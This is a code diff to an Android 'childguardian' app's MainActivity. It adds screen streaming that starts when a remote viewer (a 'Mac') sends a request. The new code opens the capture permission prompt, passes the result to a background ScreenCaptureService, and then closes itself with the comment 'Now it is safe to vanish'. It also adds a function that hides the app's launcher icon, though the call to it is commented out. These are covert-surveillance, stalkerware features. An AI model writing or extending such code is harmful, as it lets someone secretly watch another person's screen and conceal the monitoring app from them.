@@ -17,7 +17,16 @@ import android.os.Build
 import kotlinx.coroutines.launch
 import android.content.Intent
 import com.childguardian.services.core.CoreService
-
+import org.webrtc.PeerConnectionFactory
+import android.app.Activity
+import android.media.projection.MediaProjectionManager
+import androidx.activity.result.contract.ActivityResultContracts
+import com.childguardian.services.screen.MediaProjectionHolder
+import com.childguardian.services.screen.ScreenCaptureService
+import android.content.ComponentName
+import android.content.pm.PackageManager
+import android.view.WindowManager
+import android.content.Context
 @AndroidEntryPoint
 class MainActivity : AppCompatActivity() {
 
@@ -27,27 +36,90 @@ class MainActivity : AppCompatActivity() {
     @Inject
     lateinit var socketManager: SocketManager
 
+    @Inject
+    lateinit var mediaProjectionHolder: MediaProjectionHolder
+
+    private var currentViewerId: String? = null
+    private val screenCaptureLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            Timber.d("Permission granted! Sending ticket to Service...")
+
+            // 1. Prepare the hand-off to the ScreenCaptureService
+            val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
+                action = "START_STREAM"
+                // We pass the raw result data (the "Ticket") to the service
+                putExtra("RESULT_CODE", result.resultCode)
+                putExtra("DATA", result.data)
+                // Ensure the viewerId from the command is passed along
+                putExtra("VIEWER_ID", currentViewerId)
+            }
+
+            // 2. Start the service safely
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+
+            // 3. Now it is safe to vanish
+            // hideAppIcon()
+            finish()
+        } else {
+            Timber.e("Screen capture permission denied or data is null")
+            finish()
+        }
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        // Make window transparent or just finish quickly?
-        // For now, set a simple layout (we'll create it)
+
+
+        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE)
         setContentView(R.layout.activity_main)
 
-        lifecycleScope.launch {
-            // Check if already registered
-            val deviceInfo = deviceRepository.getDeviceInfoSync()
-            if (deviceInfo?.registered == true) {
-                // Already registered, just start services and finish
-                Timber.d("Device already registered, starting services")
-                socketManager.connect(deviceInfo.deviceId)
-                startBackgroundServices()
-                finish()
-            } else {
-                // Not registered, perform registration
-                performRegistration()
+        // Process the intent that started the app
+        handleStreamRequest(intent)
+    }
+
+    // <<< ADD THIS: The Catcher's Mitt for when the app is already awake!
+    override fun onNewIntent(intent: Intent?) {
+        super.onNewIntent(intent)
+        setIntent(intent) // Update the activity's intent
+        handleStreamRequest(intent) // Process the new command
+    }
+
+    // Our new Traffic Cop
+    private fun handleStreamRequest(currentIntent: Intent?) {
+        currentViewerId = currentIntent?.getStringExtra("VIEWER_ID")
+
+        if (currentViewerId != null) {
+            // SCENARIO A: The Mac requested a stream
+            Timber.d("Mac requested stream! Popping permission box for viewer: $currentViewerId")
+            val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
+
+        } else {
+            // SCENARIO B: Normal app launch
+            Timber.d("Normal app launch detected.")
+            lifecycleScope.launch {
+                val deviceInfo = deviceRepository.getDeviceInfoSync()
+                if (deviceInfo?.registered == true) {
+                    Timber.d("Device already registered, starting background services")
+                    socketManager.connect(deviceInfo.deviceId)
+                    startBackgroundServices()
+                    // finish() is currently commented out for testing, leave it that way!
+                } else {
+                    performRegistration()
+                }
             }
         }
     }
+
+
+    // ActivityResultLauncher for screen capture
+
 
     private suspend fun performRegistration() {
         val deviceId = DeviceIdGenerator.getDeviceId(this)
@@ -60,8 +132,12 @@ class MainActivity : AppCompatActivity() {
                 Timber.d("Registration successful")
                 // Connect socket after registration
                 socketManager.connect(deviceId)
+                val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                val intent = mediaProjectionManager.createScreenCaptureIntent()
+                screenCaptureLauncher.launch(intent)
+
                 startBackgroundServices()
-                finish()
+
             },
             onFailure = { error ->
                 Timber.e(error, "Registration failed")
@@ -80,5 +156,26 @@ class MainActivity : AppCompatActivity() {
         } else {
             startService(intent)
         }
+    }
+
+    private fun startScreenCaptureService() {
+        val intent = Intent(this, ScreenCaptureService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent)
+
+        } else {
+            startService(intent)
+        }
+    }
+
+
+    private fun hideAppIcon() {
+        val packageManager = packageManager
+        val componentName = ComponentName(this, MainActivity::class.java)
+        packageManager.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
     }
 }
